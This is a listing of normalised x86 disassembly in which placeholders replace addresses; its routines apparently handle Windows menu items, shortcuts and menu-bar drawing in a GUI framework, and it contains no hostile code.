call sub_45c304
call sub_45d38c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45c304
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45c304
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45c304
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_45c304
call sub_45d38c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_45d508
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45d508
and eax 0x7f
mov al [ eax + rw-data ]
sub_45d534
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45d534
and eax 0x7f
mov al [ eax + rw-data ]
sub_45d560
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a248
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41ffc4
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45e28c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_45d5fc
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403254
mov eax [ esi + 0x44 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_45d670
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45d670
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_459db4
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45c6f8
mov eax ebx
pop esi
pop ebx
retn
sub_45d6b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_45c2f4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_45c304
call sub_45d6b0
pop ecx
test al al
je r-xdata
sub_45d748
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_45d6b0
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_459db4
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_45d778
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_45d748
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_45eb44
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_45d7e8
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_45d748
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_45d804
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_45d748
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_45ceb4
mov ebx eax
xor edx edx
mov eax edi
call sub_45d3b0
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45c81c
mov eax [ esi + 0x34 ]
call sub_45c81c
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_45a758
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_4507d8
push eax
call DrawMenuBar
sub_45d8f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_45d8f0
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_45da15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_45d748
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45c81c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45d8e0
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_45da44
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42b6b4
xor eax eax
push ebp
push sub_45db42
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42b6b4
xor eax eax
push ebp
push sub_45db17
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_45d8f0
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42b6ac
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45db49
mov eax [ rw-data ]
call sub_42b6ac
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_45d748
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_45db68
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_45deec
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_45deec
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_45dc24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_45e1c0
mov eax ebx
call sub_408bcc
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_45dcc4
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_45dc24
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404214
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404464
lea edx [ ebp - 0x200 ]
call sub_408cbc
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45dd58
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_45ddc8
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45e268
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45e268
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_45e268
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_45ddd4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_45dcc4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_45dd58
mov eax ebx
call sub_45e28c
jmp r-xdata
sub_45de3c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45de84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_4580b4
mov eax ebx
call sub_45d698
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_4580f8
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_420094
sub_45dec0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4202e0
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_45de84
sub_45df04
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45d748
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_45d748
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_461d58
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_45df60
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_45e035
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45d748
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45d748
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45c2f4
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45c304
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_40418c
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_40418c
mov eax [ ebp - 0xc ]
pop edx
call sub_408298
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_45ee54
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e03c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fc8
retn
sub_45e048
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45df04
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45df60
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_45e1c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_45d8cc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_45d748
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_45d748
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408c9c
mov eax [ ebp + 0x10 ]
call sub_408bb4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45e28c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_446e44
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45e268
mov [ ebx + 0x41 ] 0x1
sub_45e2b4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403404
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45e268
mov [ ebx + 0x41 ] 0x1
sub_45e340
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45de3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_45dcc4
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_45e3d0
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45e40c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
test esi esi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
inc [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0xd ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax edi
call sub_45a378
xor eax eax
mov al [ edi + 0x3f ]
cmp eax [ ebx ]
jne r-xdata
sub_45e458
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
mov eax ebx
call sub_45deec
mov [ ebp - 0xd ] al
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov eax [ ebx + 0x34 ]
mov ecx eax
mov edx [ eax + 0x68 ]
mov eax sub_45e40c
call sub_459db4
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
sub_45e4b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45e4de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e500
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ea33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ea3a
lea eax [ ebp - 0x30 ]
call sub_403fa4
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov edx [ esi + 0x4 ]
call sub_45d804
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46b508
